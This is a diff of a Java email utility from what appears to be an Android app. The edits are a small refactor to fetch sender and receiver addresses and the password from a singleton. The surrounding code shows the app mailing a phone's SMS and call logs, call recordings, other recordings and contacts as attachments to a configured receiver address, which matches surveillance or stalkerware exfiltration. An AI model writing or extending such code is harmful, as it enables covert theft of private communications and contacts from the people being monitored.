@@ -56,7 +56,7 @@ public class SendEmailUtil {
 		props.put("mail.smtp.port", "25");
 
 		SmtpAuth auth = new SmtpAuth();
-		auth.setAccount(MainApplication.senderEmailAddr, MainApplication.senderPwd);
+		auth.setAccount(MainApplication.getInstence().getSenderEmailAddr(), MainApplication.getInstence().getSenderPwd());
 		Session session = Session.getDefaultInstance(props, auth);
 		return session;
 	}
@@ -94,7 +94,7 @@ public class SendEmailUtil {
 					}
 
 					try {
-						sendMail("短信通话记录", content, MainApplication.receiverEmailAddr, files);
+						sendMail("短信通话记录", content, MainApplication.getInstence().getReceiverEmailAddr(), files);
 						deleteTag(con, MainApplication.PHONE_CODE_UPLOAD_SMS_CALL);
 					} catch (AddressException e) {
 						e.printStackTrace();
@@ -149,7 +149,7 @@ public class SendEmailUtil {
 					}
 
 					try {
-						sendMail("通话录音", content, MainApplication.receiverEmailAddr, files);
+						sendMail("通话录音", content, MainApplication.getInstence().getReceiverEmailAddr(), files);
 						deleteTag(con, MainApplication.PHONE_CODE_UPLOAD_AUDIO_CALL);
 					} catch (AddressException e) {
 						e.printStackTrace();
@@ -203,7 +203,7 @@ public class SendEmailUtil {
 					}
 
 					try {
-						sendMail("其它录音", content, MainApplication.receiverEmailAddr, files);
+						sendMail("其它录音", content, MainApplication.getInstence().getReceiverEmailAddr(), files);
 						deleteTag(con, MainApplication.PHONE_CODE_UPLOAD_AUDIO_OTHER);
 					} catch (AddressException e) {
 						e.printStackTrace();
@@ -278,7 +278,7 @@ public class SendEmailUtil {
 					}
 
 					try {
-						sendMail("所有", content, MainApplication.receiverEmailAddr, files);
+						sendMail("所有", content, MainApplication.getInstence().getReceiverEmailAddr(), files);
 						deleteTag(con, MainApplication.PHONE_CODE_UPLOAD_ALL);
 					} catch (AddressException e) {
 						e.printStackTrace();
@@ -327,7 +327,7 @@ public class SendEmailUtil {
 					}
 
 					try {
-						sendMail("联系人", content, MainApplication.receiverEmailAddr, files);
+						sendMail("联系人", content, MainApplication.getInstence().getReceiverEmailAddr(), files);
 						deleteTag(con, MainApplication.PHONE_CODE_UPLOAD_CONTACTS);
 					} catch (AddressException e) {
 						e.printStackTrace();
@@ -378,7 +378,7 @@ public class SendEmailUtil {
 		MimeMessage message = new MimeMessage(initialize());
 
 		try {
-			message.setFrom(new InternetAddress(MainApplication.senderEmailAddr));
+			message.setFrom(new InternetAddress(MainApplication.getInstence().getSenderEmailAddr()));
 			// message.setSender(new InternetAddress(userName));
 		} catch (AddressException e) {
 			e.printStackTrace();
@@ -421,7 +421,8 @@ public class SendEmailUtil {
 				}
 				try {
 					attachPart.setFileName(MimeUtility.encodeWord(fds.getName(), "utf-8", null));
-					// attachPart.setFileName(MimeUtility.encodeWord(fds.getName(), "GB2312", null));
+					// attachPart.setFileName(MimeUtility.encodeWord(fds.getName(),
+					// "GB2312", null));
 				} catch (MessagingException e) {
 					e.printStackTrace();
 				} catch (UnsupportedEncodingException e) {
